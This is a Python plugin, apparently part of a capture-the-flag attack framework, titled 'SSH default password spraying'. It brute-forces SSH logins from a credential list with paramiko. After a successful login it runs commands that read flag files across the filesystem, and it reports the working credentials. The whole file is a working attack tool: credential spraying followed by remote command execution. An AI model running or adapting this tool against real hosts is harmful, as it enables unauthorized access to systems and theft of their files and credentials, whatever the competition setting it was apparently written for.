"""SSH 默认口令喷洒。"""

from __future__ import annotations

from typing import Any

import paramiko

from ..targets import Target
from .base import (
    Emit,
    Finding,
    Param,
    Plugin,
    find_flags,
    parse_credentials,
    read_text_param,
)

DEFAULT_COMMANDS = (
    "cat /flag /flag.txt /root/flag /root/flag.txt /tmp/flag 2>/dev/null; "
    "find / -maxdepth 3 -name 'flag*' -type f 2>/dev/null | head -5 | xargs cat 2>/dev/null"
)


class SshBrute(Plugin):
    name = "ssh_brute"
    title = "SSH 默认口令喷洒"
    description = "读账号字典批量试 SSH 登录，成功后执行命令取 flag。"
    default_port = 22
    params = [
        Param("cred_file", "账号字典文件", "file", "", help="每行 user:pass 或 user pass，路径相对当前目录"),
        Param("credentials", "或直接填账号", "textarea", "", help="每行 user:pass，和上面的文件二选一", rows=4),
        Param("commands", "登录后执行命令", "textarea", DEFAULT_COMMANDS, rows=2),
        Param("timeout", "连接超时(秒)", "float", 8),
        Param("max_tries", "每目标最多尝试", "int", 20),
        Param("flag_regex", "flag 标记或正则(可选)", "text", "",
              help="填 flag{ 或 flag 就行，会自动补全；要精确控制再写完整正则"),
    ]

    def run(self, target: Target, params: dict[str, Any], emit: Emit) -> list[Finding] | None:
        creds: list[tuple[str, str]] = []
        if params.get("cred_file"):
            creds.extend(parse_credentials(read_text_param(params["cred_file"], "账号字典")))
        if params.get("credentials"):
            creds.extend(parse_credentials(params["credentials"]))
        if not creds:
            emit("error", "没有可用账号，先给字典文件或直接填账号")
            return None

        seen: set[tuple[str, str]] = set()
        unique: list[tuple[str, str]] = []
        for cred in creds:
            if cred not in seen:
                seen.add(cred)
                unique.append(cred)

        timeout = float(params.get("timeout") or 8)
        max_tries = int(params.get("max_tries") or 20)
        port = target.port or self.default_port
        commands = str(params.get("commands") or DEFAULT_COMMANDS)
        extra_regex = [params["flag_regex"]] if params.get("flag_regex") else []

        for index, (user, password) in enumerate(unique[:max_tries], start=1):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    target.host,
                    port=port,
                    username=user,
                    password=password,
                    timeout=timeout,
                    banner_timeout=timeout,
                    auth_timeout=timeout,
                    allow_agent=False,
                    look_for_keys=False,
                )
            except paramiko.AuthenticationException:
                emit("debug", f"[{index}] {user}:{password} 失败")
                client.close()
                continue
            except (paramiko.SSHException, OSError) as exc:
                emit("debug", f"连接异常: {exc}")
                client.close()
                return None

            try:
                emit("ok", f"登录成功 {user}:{password}")
                _, stdout, _ = client.exec_command(commands, timeout=timeout)
                output = stdout.read().decode("utf-8", "replace")
                flags = find_flags(output, extra_regex)
                if flags:
                    emit("ok", f"拿到 flag: {flags[0]}")
                    return [
                        Finding(
                            target=target.label,
                            plugin=self.name,
                            flag=flag,
                            evidence=output[-1500:],
                            extra={"user": user, "password": password},
                        )
                        for flag in flags
                    ]
                emit("warn", f"登录成功但没有 flag: {user}:{password}")
                return [
                    Finding(
                        target=target.label,
                        plugin=self.name,
                        flag="",
                        evidence=output[-800:],
                        extra={"user": user, "password": password},
                    )
                ]
            except (paramiko.SSHException, OSError) as exc:
                emit("warn", f"登录后执行命令失败: {exc}")
                return None
            finally:
                client.close()

        emit("warn", "字典已试完，没登上")
        return None
